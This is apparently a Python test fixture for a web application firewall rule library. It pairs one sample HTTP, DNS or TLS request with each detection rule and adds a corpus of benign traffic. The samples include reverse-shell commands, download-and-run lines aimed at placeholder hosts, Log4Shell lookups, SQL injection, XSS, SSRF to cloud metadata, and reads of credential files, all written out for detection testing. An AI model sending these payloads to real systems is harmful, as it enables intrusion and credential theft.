"""
One sample request per rule of the library in rules/crs/, plus a corpus
of ordinary traffic that must not raise a single alert.

Used by tests/rules/test_library.py. A Sample describes one HTTP request
(or a DNS query, or a TLS ClientHello); `sid` is the rule it must
trigger. Other rules may fire too: overlapping rules are normal in a
CRS-style library, and test_library.py --verbose lists them.

Request fields:
  q       decoded value for "?q=", percent-encoded on the wire
  uri     raw request target (used as is; combined with q if both given)
  method  default GET, or POST when there is a body
  ua      User-Agent (default: an ordinary browser)
  headers extra raw header lines, "Name: value" separated by "\\r\\n"
  cookie  Cookie header value
  form    decoded value of a form field "x", sent url-encoded
  body    raw body (str or bytes) with `ctype` as Content-Type
  repeat  send the request this many times (threshold rules)
"""

from dataclasses import dataclass
from typing import Optional, Union

BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
JSON = "application/json"
XML = "application/xml"
TEXT = "text/plain"
FORM = "application/x-www-form-urlencoded"


@dataclass
class Sample:
    sid: int
    q: Optional[str] = None
    uri: Optional[str] = None
    method: Optional[str] = None
    ua: Optional[str] = BROWSER_UA
    headers: str = ""
    cookie: Optional[str] = None
    form: Optional[str] = None
    body: Optional[Union[str, bytes]] = None
    ctype: Optional[str] = None
    dns: Optional[str] = None
    sni: Optional[str] = None
    repeat: int = 1


S = Sample

SERIALIZED_PHP = 'O:4:"User":1:{s:4:"name";s:5:"admin";}'

SAMPLES = [
    # ---- 913 scanners ---------------------------------------------------
    S(913001, ua="DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"),
    S(913002, ua="gobuster/3.6"),
    S(913003, ua="Fuzz Faster U Fool v2.1.0"),
    S(913004, ua="Wfuzz/3.1.0"),
    S(913005, ua="Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"),
    S(913006, ua="masscan/1.3 (https://github.com/robertdavidgraham/masscan)"),
    S(913007, ua="Mozilla/5.0 zgrab/0.x"),
    S(913008, ua="WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"),
    S(913009, ua="WhatWeb/0.5.5"),
    S(913010, ua="Mozilla/4.0 (Hydra)"),
    S(913011, ua="Mozilla/5.0 (compatible; Nessus SOAP)"),
    S(913012, ua="Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4.1)"),
    S(913015, ua="commix/v3.9-stable (https://commixproject.com)"),
    S(913016, ua="Mozilla/5.0 (compatible; Netsparker)"),
    S(913017, ua="Mozilla/4.0 (compatible; MSIE 7.0; Havij)"),
    S(913020, headers="Acunetix-Product: WVS/12.0"),
    S(913030, uri="/phpmyadmin/index.html"),
    S(913031, uri="/HNAP1/"),
    S(913032, uri="/wp-admin/install.php"),
    S(913033, uri="/actuator/env"),
    S(913040, uri="/wp-login.php", method="POST", body="log=admin&pwd=guess", ctype=FORM,
      repeat=11),
    S(913041, uri="/xmlrpc.php", body="<?xml version=\"1.0\"?><methodCall><methodName>"
      "system.multicall</methodName></methodCall>", ctype=XML),

    # ---- 920 protocol enforcement ----------------------------------------
    S(920001, uri="/", method="TRACE"),
    S(920004, uri="/dav/", method="PROPFIND"),
    S(920005, uri="/uploads/shell.jsp", method="PUT", body="x", ctype=TEXT),
    S(920010, headers="Proxy: http://10.9.9.9:8080"),
    S(920011, headers="Range: bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9,5-10"),
    S(920012, uri="/", headers="X-Original-URL: /admin"),
    S(920013, uri="/", headers="X-Rewrite-URL: /admin"),
    S(920020, uri="/config.bak"),
    S(920022, uri="/.index.html.swp"),
    S(920023, uri="/dump.sql"),
    S(920025, uri="/php.ini"),
    S(920026, uri="/logs/error.log"),
    S(920027, uri="/backup.zip"),

    # ---- 921 protocol attacks --------------------------------------------
    S(921001, method="POST", headers="Content-Length: 5\r\nTransfer-Encoding: chunked",
      body="0\r\n\r\n", ctype=TEXT),
    S(921002, method="POST", headers="Transfer-Encoding: xchunked", body="0\r\n\r\n", ctype=TEXT),
    S(921003, method="POST", headers="Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
      body="0\r\n\r\n", ctype=TEXT),
    S(921004, headers="Content-Length: 0, 7"),
    S(921005, body="GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n", ctype=TEXT),
    S(921011, q="x\r\nSet-Cookie: session=attacker"),
    S(921012, q="x\r\nLocation: http://evil.example/"),
    S(921013, q="x\r\nHTTP/1.1 200 OK"),

    # ---- 930 LFI -----------------------------------------------------------
    S(930001, uri="/download?file=/etc/shadow"),
    S(930003, q="/etc/hosts"),
    S(930004, q="/proc/self/environ"),
    S(930006, q="/var/log/apache2/access.log"),
    S(930007, q="/root/.ssh/id_rsa"),
    S(930008, q="/home/user/.ssh/authorized_keys"),
    S(930009, q="/root/.bash_history"),
    S(930010, q="C:\\boot.ini"),
    S(930011, q="C:\\Windows\\win.ini"),
    S(930012, q="C:\\Windows\\system.ini"),
    S(930013, q="C:/Windows/repair/config/SAM"),
    S(930020, uri="/.git/config"),
    S(930021, uri="/.svn/entries"),
    S(930022, uri="/.hg/hgrc"),
    S(930023, uri="/.env"),
    S(930024, uri="/.htaccess"),
    S(930025, uri="/.htpasswd"),
    S(930026, uri="/web.config"),
    S(930027, uri="/WEB-INF/web.xml"),
    S(930028, uri="/wp-config.php.save"),
    S(930030, uri="/.aws/credentials"),
    S(930040, uri="/view?file=/etc/issue"),
    S(930041, q="../../../etc/issue"),
    S(930042, q="..\\..\\..\\boot"),
    S(930043, uri="/?f=....//....//etc/issue"),

    # ---- 931 RFI -----------------------------------------------------------
    S(931001, uri="/?page=http://10.1.2.3/shell.txt"),
    S(931002, uri="/?page=http://evil.example/shell.txt?"),
    S(931003, uri="/?include=https://evil.example/x"),
    S(931004, uri="/?f=ftp://evil.example/x"),
    S(931005, uri="/?f=%5C%5Cevil.example%5Cshare%5Cx"),
    S(931006, q="file:///etc/issue"),
    S(931007, q="gopher://127.0.0.1:6379/_FLUSHALL"),
    S(931010, form="file:///etc/issue"),

    # ---- 932 RCE -----------------------------------------------------------
    S(932001, q="1;id"),
    S(932026, q="x|id"),
    S(932002, q="x;whoami"),
    S(932003, q="x;uname -a"),
    S(932004, q="x;cat /etc/issue"),
    S(932005, q="wget http://evil.example/x.sh"),
    S(932006, q="x;curl -s evil.example"),
    S(932007, q="nc 10.0.0.9 4444 -e /bin/sh"),
    S(932008, q="bash -c 'exec 3<>/dev/tcp/10.0.0.9/4444'"),
    S(932009, q="x;bash -i"),
    S(932010, q="x;python3 -c 'import os'"),
    S(932011, q="x;perl -e 'print 1'"),
    S(932012, q="x;chmod 777 /tmp/a"),
    S(932013, q="cat${IFS}/etc/issue"),
    S(932014, q="x;/bin/bash"),
    S(932017, q="x;sleep 5"),
    S(932018, q="x|ping -c 10 127.0.0.1"),
    S(932019, q="x;nslookup a.evil.example"),
    S(932020, q="mkfifo /tmp/p"),
    S(932021, q="/???/c?t /???/i??e"),
    S(932024, form="bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"),
    S(932025, form="x;/bin/sh -c id"),
    S(932030, ua="() { :; }; echo vulnerable"),
    S(932040, q="powershell -nop -w hidden"),
    S(932041, q="IEX (New-Object Net.WebClient).DownloadString('http://x/a')"),
    S(932043, q="x&cmd /c dir"),
    S(932044, q="certutil -urlcache -split -f http://x/a.exe"),
    S(932045, q="bitsadmin /transfer j http://x/a.exe c:\\a.exe"),
    S(932046, q="net user hacker P@ss1 /add"),
    S(932047, q="rundll32 shell32.dll,Control_RunDLL"),
    S(932048, q="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"),
    S(932049, q="mshta http://x/a.hta"),
    S(932050, q="wmic process call create calc"),

    # ---- 933 PHP -----------------------------------------------------------
    S(933001, uri="/?page=php://input"),
    S(933002, uri="/?page=php://filter/convert.base64-encode/resource=index"),
    S(933003, q="data://text/plain;base64,PD9waHA="),
    S(933004, q="phar://uploads/avatar.jpg"),
    S(933007, q="php://filter/convert.iconv.UTF8.CSISO2022KR/resource=x"),
    S(933010, q="phpinfo()"),
    S(933011, q="eval(x)"),
    S(933012, form="eval(base64_decode('aWQ='))"),
    S(933013, q="assert('1')"),
    S(933014, q="system('id')"),
    S(933015, q="passthru('id')"),
    S(933016, q="shell_exec('id')"),
    S(933018, q="base64_decode('aWQ=')"),
    S(933019, q="gzinflate(x)"),
    S(933023, q="file_put_contents('a.php','x')"),
    S(933024, q="$_GET[cmd]"),
    S(933026, q="$_POST[cmd]"),
    S(933030, uri="/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"),
    S(933031, uri="/index.php?-d+auto_prepend_file%3d/etc/issue"),
    S(933040, q=SERIALIZED_PHP),
    S(933041, form=SERIALIZED_PHP),
    S(933042, cookie="session=" + SERIALIZED_PHP),
    S(933050, body="--XB\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\n"
      "Content-Type: image/png\r\n\r\nGIF89a\r\n--XB--\r\n",
      ctype="multipart/form-data; boundary=XB"),
    S(933051, body="<?php phpinfo(); ?>", ctype=TEXT),
    S(933052, body="<?= `id` ?>", ctype=TEXT),
    S(933054, ua="<?php system($_GET['c']); ?>"),
    S(933060, uri="/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"),
    S(933061, uri="/index.php?s=index/think%5Capp/invokefunction&function=phpinfo"),

    # ---- 934 generic ---------------------------------------------------------
    S(934001, q="{{''.__class__.__mro__}}"),
    S(934002, q="{{url_for.__globals__}}"),
    S(934004, q="{{x.__builtins__}}"),
    S(934005, q="__import__('os').getcwd()"),
    S(934006, q="{{7*7}}"),
    S(934007, q='<#assign ex="freemarker.template.utility.Execute"?new()>'),
    S(934008, q="<#assign x=1>"),
    S(934010, q="__${T(java.lang.Runtime)}__::.x"),
    S(934011, q="<%= 7*7 %>"),
    S(934013, form="{{''.__class__}}"),
    S(934020, q="require('child_process').exec('id')"),
    S(934021, body='{"cmd":"require(\'child_process\').exec(\'id\')"}', ctype=JSON),
    S(934023, body='{"rce":"_$$ND_FUNC$$_function(){return 1}()"}', ctype=JSON),
    S(934024, uri="/?__proto__%5Badmin%5D=1"),
    S(934025, body='{"__proto__":{"admin":true}}', ctype=JSON),
    S(934026, uri="/?constructor%5Bprototype%5D%5Badmin%5D=1"),
    S(934030, q="http://169.254.169.254/latest/meta-data/"),
    S(934031, body='{"url":"http://169.254.169.254/latest/meta-data/"}', ctype=JSON),
    S(934032, q="http://metadata.google.internal/computeMetadata/v1/"),
    S(934034, uri="/fetch?url=http://127.0.0.1:8080/admin"),
    S(934035, uri="/fetch?url=http://2130706433/"),
    S(934040, body='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/issue">]>'
      "<r>&x;</r>", ctype=XML),
    S(934041, body='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://x/e.dtd"> %p;]>'
      "<r/>", ctype=XML),
    S(934042, body='<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/etc/issue"/></r>',
      ctype=XML),
    S(934043, q='<!ENTITY x SYSTEM "file:///etc/issue">'),
    S(934050, dns="c0ffee.interact.sh"),
    S(934051, dns="c0ffee.oast.fun"),
    S(934052, dns="c0ffee.oast.me"),
    S(934055, dns="c0ffee.burpcollaborator.net"),
    S(934056, dns="c0ffee.oastify.com"),
    S(934057, dns="c0ffee.dnslog.cn"),
    S(934060, sni="c0ffee.interact.sh"),
    S(934061, sni="c0ffee.oastify.com"),
    S(934062, sni="a1b2c3.ngrok-free.app"),
    S(934063, headers="Referer: http://c0ffee.oast.fun/"),

    # ---- 941 XSS -----------------------------------------------------------
    S(941001, q="<script src=//evil.example/x.js></script>"),
    S(941002, cookie="pref=<script>alert(1)</script>"),
    S(941003, q="<svg onload=alert(1)>"),
    S(941004, q="<img src=x onerror=alert(1)>"),
    S(941005, q="<iframe src=//evil.example>"),
    S(941006, q="<object data=x.swf>"),
    S(941008, q="<body onload=alert(1)>"),
    S(941020, q='" onerror = "alert(1)'),
    S(941021, q="x onload=alert(1)"),
    S(941022, q='" onmouseover="alert(1)'),
    S(941023, q="<input autofocus onfocus=alert(1)>"),
    S(941024, q="<a onclick=alert(1)>x</a>"),
    S(941030, q="vbscript:msgbox(1)"),
    S(941031, q="data:text/html;base64,PHNjcmlwdD4="),
    S(941032, q="new Image().src='//x/?'+document.cookie"),
    S(941034, q="document.write(1)"),
    S(941035, q="alert(1)"),
    S(941036, q="prompt('x')"),
    S(941046, q="confirm(1)"),
    S(941037, q="String.fromCharCode(88,83,83)"),
    S(941038, q='eval(atob("YWxlcnQoMSk="))'),
    S(941040, q='<iframe srcdoc="x">'),
    S(941041, q="<button formaction=javascript:alert(1)>"),
    S(941044, q="{{constructor.constructor('alert(1)')()}}"),
    S(941050, form="<script src=//x/a.js></script>"),
    S(941051, form="<img src=x onerror=alert(1)>"),
    S(941054, form="<svg onload=alert(1)>"),
    S(941052, form="javascript:alert(1)"),
    S(941053, headers="Referer: http://x/<script>alert(1)</script>"),

    # ---- 942 SQLi / NoSQLi / LDAPi -------------------------------------------
    S(942001, q="1 UNION/**/SELECT 1,2"),
    S(942002, form="1 union all select 1"),
    S(942010, q="1 or 1=1"),
    S(942011, q="x' or 'a'='a"),
    S(942012, form="x' or 'a'='a"),
    S(942014, q="admin'--"),
    S(942016, q="1' and 2>1"),
    S(942017, q="1 /*!50000union*/"),
    S(942018, q="1 order by 5--"),
    S(942020, q="1 and sleep(5)"),
    S(942021, q="benchmark(1000000,md5(1))"),
    S(942022, q="1;select pg_sleep(5)"),
    S(942023, q="1;waitfor delay '0:0:5'"),
    S(942024, q="dbms_pipe.receive_message('a',5)"),
    S(942030, q="select table_name from information_schema.tables"),
    S(942031, q="select @@version"),
    S(942032, q="select database()"),
    S(942047, q="select version()"),
    S(942036, q="select name from sysobjects"),
    S(942038, q="extractvalue(1,concat(0x7e,(select 1)))"),
    S(942039, q="updatexml(1,concat(0x7e,(select 1)),1)"),
    S(942041, q="char(97,100,109)"),
    S(942042, uri="/?id=0x61646d696e61646d696e"),
    S(942050, q="load_file('/etc/issue')"),
    S(942051, q="select 1 into outfile '/tmp/x'"),
    S(942052, q="select 1 into dumpfile '/tmp/x'"),
    S(942054, q="exec xp_cmdshell 'dir'"),
    S(942055, q="exec master..xp_dirtree '//x/y'"),
    S(942057, q="utl_http.request('http://x')"),
    S(942060, q="1; shutdown --"),
    S(942064, q="1; insert into users values(1)"),
    S(942070, cookie="id=1' or '1'='1"),
    S(942071, headers="X-Forwarded-For: 1.2.3.4' or sleep(5)"),
    S(942080, uri="/login?user=admin&pass%5B%24ne%5D=x"),
    S(942083, q="$where: sleep(100)"),
    S(942084, body='{"user":"admin","pass":{"$ne":""}}', ctype=JSON),
    S(942086, body='{"$where":"sleep(100)"}', ctype=JSON),
    S(942090, q="*)(uid=*))(|(uid=*"),

    # ---- 943 session fixation --------------------------------------------
    S(943001, uri="/?PHPSESSID=attacker1"),
    S(943002, uri="/?jsessionid=attacker1"),
    S(943003, uri="/?ASPSESSIONIDQQ=attacker1"),
    S(943004, q="document.cookie='sid=attacker1'"),

    # ---- 944 Java ----------------------------------------------------------
    S(944001, q="${jndi:ldap://x.example/a}"),
    S(944002, headers="X-Api-Version: ${jndi:ldap://x.example/a}"),
    S(944003, body='{"name":"${jndi:ldap://x.example/a}"}', ctype=JSON),
    S(944004, headers="X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://x.example/a}"),
    S(944006, headers="X-Api-Version: ${${lower:j}ndi:ldap://x.example/a}"),
    S(944007, headers="X-Api-Version: ${env:AWS_SECRET_ACCESS_KEY}"),
    S(944010, uri="/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"),
    S(944011, body="class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
      ctype=FORM),
    S(944013, uri="/functionRouter", method="POST",
      headers="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime()"),
    S(944014, q="T(java.lang.Runtime)"),
    S(944020, q="java.lang.Runtime"),
    S(944021, body="java.lang.Runtime", ctype=TEXT),
    S(944022, q="new java.lang.ProcessBuilder('id').start()"),
    S(944024, q="Runtime.getRuntime().exec('id')"),
    S(944030, q="%{(#a=1)}"),
    S(944031, headers="Content-Type: %{(#_='multipart/form-data')}"),
    S(944032, q="#_memberAccess['allowStaticMethodAccess']=true"),
    S(944034, uri="/%24%7B%28%23a%3D1%29%7D/"),
    S(944040, body="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA", ctype=TEXT),
    S(944041, cookie="rememberMe=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"),
    S(944042, body=b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap", ctype="application/x-java-serialized-object"),
    S(944044, body="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", ctype=TEXT),
    S(944045, body='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a"}', ctype=JSON),
    S(944046, body='{"a":"com.sun.rowset.JdbcRowSetImpl"}', ctype=JSON),
]

# Ordinary traffic: none of it may raise an alert. Words that attack rules
# key on ("union", "select", "sleep", "curl", "alert", "order by" ...)
# appear here on purpose, in harmless positions.
CLEAN = [
    S(0, uri="/"),
    S(0, uri="/favicon.ico"),
    S(0, uri="/robots.txt"),
    S(0, uri="/sitemap.xml"),
    S(0, uri="/static/app.min.js?v=3.1.4"),
    S(0, uri="/images/logo.svg"),
    S(0, uri="/wp-content/themes/twentyfour/style.css?ver=1.2"),
    S(0, uri="/download/report-2024.pdf"),
    S(0, uri="/api/v1/users/42"),
    S(0, uri="/api/orders?status=open&from=2024-01-01&to=2024-12-31"),
    S(0, uri="/products?category=garden&sort=price_asc&page=2"),
    S(0, uri="/news?id=1234&lang=en"),
    S(0, uri="/user/settings?tab=security"),
    S(0, uri="/checkout?coupon=SAVE10"),
    S(0, uri="/changelog?since=v1.2.0"),
    S(0, uri="/docs/javascript-tutorial"),
    S(0, uri="/blog/how-to-use-curl-with-json"),
    S(0, uri="/blog/2024/05/backup-strategies"),
    S(0, uri="/careers/devops-engineer"),
    S(0, q="O'Reilly books"),
    S(0, q="union jack flag"),
    S(0, q="select a plan"),
    S(0, q="sleep tips for babies"),
    S(0, q="price alert settings"),
    S(0, q="python scripts for beginners"),
    S(0, q="cat food"),
    S(0, q="c++ tutorial"),
    S(0, q="version history"),
    S(0, q="database design"),
    S(0, q="order by date"),
    S(0, q="how to use curl"),
    S(0, q="Ben & Jerry's"),
    S(0, q="what is 1+1"),
    S(0, q="system requirements (windows)"),
    S(0, q="ls -la explained"),
    S(0, q="where is the nearest station?"),
    S(0, q="admin panel login help"),
    S(0, q="php tutorial"),
    S(0, q="ping pong table"),
    S(0, q="java.util.List example"),
    S(0, q="email me at alice@example.com"),
    S(0, q="50% off, today only!"),
    S(0, q="it's a dog's life"),
    S(0, q="\u53f0\u5317 101"),
    S(0, method="POST", uri="/login", form="correct horse battery staple"),
    S(0, method="POST", uri="/comment", form="Great article! Can't wait for part 2 :)"),
    S(0, method="POST", uri="/api/v1/users",
      body='{"name":"Alice","email":"alice@example.com","tags":["a","b"],"admin":false}',
      ctype=JSON),
    S(0, method="POST", uri="/api/search", body='{"query":"select","limit":10,"offset":20}',
      ctype=JSON),
    S(0, method="POST", uri="/api/stream", headers="Transfer-Encoding: chunked",
      body="5\r\nhello\r\n0\r\n\r\n", ctype=TEXT),
    S(0, method="POST", uri="/api/stream", headers="Transfer-Encoding: gzip, chunked",
      body="0\r\n\r\n", ctype=TEXT),
    S(0, method="POST", uri="/upload",
      body="--XB\r\nContent-Disposition: form-data; name=\"f\"; filename=\"cat.png\"\r\n"
           "Content-Type: image/png\r\n\r\n\x89PNG\r\n--XB--\r\n",
      ctype="multipart/form-data; boundary=XB"),
    S(0, method="POST", uri="/soap", ctype=XML,
      body='<?xml version="1.0"?><Envelope><Body><GetPrice><Item>Apple</Item></GetPrice>'
           "</Body></Envelope>"),
    S(0, uri="/", ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      headers="Accept: text/html,application/xhtml+xml\r\nAccept-Language: zh-TW,zh;q=0.9,en;q=0.8\r\n"
              "Referer: https://www.google.com/\r\nAccept-Encoding: gzip, deflate, br",
      cookie="session=abc123; theme=dark; _ga=GA1.2.3.4"),
    S(0, uri="/", ua="curl/8.5.0"),
    S(0, uri="/", ua="python-requests/2.32.3"),
    S(0, uri="/", headers="X-Forwarded-For: 203.0.113.7, 10.0.0.1"),
    S(0, uri="/", headers="Range: bytes=0-1023"),
    S(0, uri="/video.mp4", headers="Range: bytes=0-99,200-299"),
    S(0, dns="www.example.com"),
    S(0, dns="api.github.com"),
    S(0, dns="oast.example.org"),
    S(0, sni="www.example.org"),
    S(0, sni="ngrok.com"),
]
